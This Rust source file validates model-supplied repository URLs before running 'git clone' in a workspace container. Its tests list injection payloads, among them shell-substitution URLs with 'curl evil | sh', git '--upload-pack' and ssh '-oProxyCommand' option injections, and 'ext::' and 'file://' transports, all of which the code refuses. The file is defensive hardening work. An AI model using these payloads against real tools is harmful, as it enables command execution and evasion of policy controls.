use crate::{Result, WorkspaceError};

/// Where the clone lands inside the workspace container.
const CLONE_DIR: &str = "/workspace";

/// Schemes git reaches over the network. `ext::` runs an arbitrary command
/// and `file://` or a bare path reads the container's own filesystem, so
/// neither may come from the model.
const URL_SCHEMES: [&str; 3] = ["https://", "ssh://", "git://"];

/// Arguments to the container runtime that clone `repo_url` into the
/// workspace. git runs directly, never under a shell, so shell syntax in the
/// URL stays literal, and `--` keeps git from reading the URL as an option.
pub(crate) fn clone_args<'a>(workspace_id: &'a str, repo_url: &'a str) -> Result<[&'a str; 7]> {
    validate_repo_url(repo_url)?;
    Ok([
        "exec",
        workspace_id,
        "git",
        "clone",
        "--",
        repo_url,
        CLONE_DIR,
    ])
}

fn validate_repo_url(url: &str) -> Result<()> {
    if url.starts_with('-') {
        return Err(invalid(url, "must not start with '-'"));
    }
    if url.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(invalid(
            url,
            "must not contain whitespace or control characters",
        ));
    }
    let authority = match URL_SCHEMES.iter().find_map(|s| url.strip_prefix(s)) {
        Some(rest) => rest
            .split_once('/')
            .map_or(rest, |(authority, _)| authority),
        None => scp_authority(url).ok_or_else(|| {
            invalid(
                url,
                "must be an https://, ssh:// or git:// URL, or scp-style user@host:path",
            )
        })?,
    };
    let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
    if host.is_empty() || host.starts_with(':') {
        return Err(invalid(url, "has no host"));
    }
    // ssh receives the user, host and port as its own arguments, so one
    // that starts with '-' would be read as an ssh option such as
    // -oProxyCommand.
    if authority
        .split(['@', ':'])
        .any(|part| part.starts_with('-'))
    {
        return Err(invalid(
            url,
            "has a user, host or port that starts with '-'",
        ));
    }
    Ok(())
}

/// The `user@host` of an scp-style `user@host:path`. git takes a `:` before
/// any `/` as this form; without the `@` the prefix could instead name a
/// remote helper (`ext::`, `file::`).
fn scp_authority(url: &str) -> Option<&str> {
    let (authority, path) = url.split_once(':')?;
    let (user, _) = authority.split_once('@')?;
    (!user.is_empty() && !authority.contains('/') && !path.is_empty()).then_some(authority)
}

fn invalid(url: &str, reason: &str) -> WorkspaceError {
    WorkspaceError::InvalidParams(format!("repo_url {url:?} {reason}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use arkavo_test_macros::spec;

    fn assert_refused(url: &str) {
        match clone_args("ws", url) {
            Err(WorkspaceError::InvalidParams(msg)) => assert!(msg.contains("repo_url"), "{msg}"),
            other => panic!("{url:?} was not refused: {other:?}"),
        }
    }

    #[spec("WORKSPACE-003")]
    #[test]
    fn accepted_url_reaches_git_as_one_argument_after_double_dash() {
        for url in [
            "https://github.com/arkavo-org/arkavo-edge.git",
            "https://token@github.com/org/repo",
            "ssh://git@github.com:22/org/repo.git",
            "ssh://[::1]/srv/repo.git",
            "git://example.com/repo.git",
            "git@github.com:org/repo.git",
        ] {
            assert_eq!(
                clone_args("ws", url).expect(url),
                ["exec", "ws", "git", "clone", "--", url, "/workspace"]
            );
        }
    }

    /// Regression: the URL used to be pasted into `sh -c "git clone <url>"`,
    /// so `;` or `$(...)` ran extra commands in the container, bypassing a
    /// policy that allows `create` but denies `execute`.
    #[spec("WORKSPACE-003")]
    #[test]
    fn shell_syntax_in_url_never_reaches_a_shell() {
        for url in [
            "https://x/y;curl${IFS}evil|sh",
            "https://x/$(touch${IFS}/tmp/pwned)",
            "git@host:repo`id`.git",
        ] {
            let argv = clone_args("ws", url).expect(url);
            assert!(!argv.contains(&"sh") && !argv.contains(&"-c"), "{argv:?}");
            assert_eq!(argv[4..6], ["--", url]);
        }
        assert_refused("https://x/y; curl evil | sh");
        assert_refused("https://x/$(touch /tmp/pwned)");
    }

    #[spec("WORKSPACE-003")]
    #[test]
    fn option_shaped_url_is_refused() {
        for url in [
            "--upload-pack=touch /tmp/pwned",
            "--upload-pack=id",
            "-oProxyCommand=id",
            "ssh://-oProxyCommand=id/repo",
            "ssh://-oProxyCommand=id@host/repo",
            "ssh://host:-oProxyCommand=id/repo",
            "git@-oProxyCommand=id:repo",
        ] {
            assert_refused(url);
        }
    }

    #[spec("WORKSPACE-003")]
    #[test]
    fn local_and_command_transports_are_refused() {
        for url in [
            "ext::sh -c touch% /tmp/pwned",
            "ext::id",
            "file:///etc",
            "file::/etc",
            "/srv/repo.git",
            "./repo@host:path",
            "http://example.com/repo.git",
            "HTTPS://example.com/repo.git",
            "fd::3",
            "https:///repo.git",
            "https://user@/repo.git",
            "host:repo.git",
            "@host:repo.git",
            "git@host:",
            "",
        ] {
            assert_refused(url);
        }
    }
}
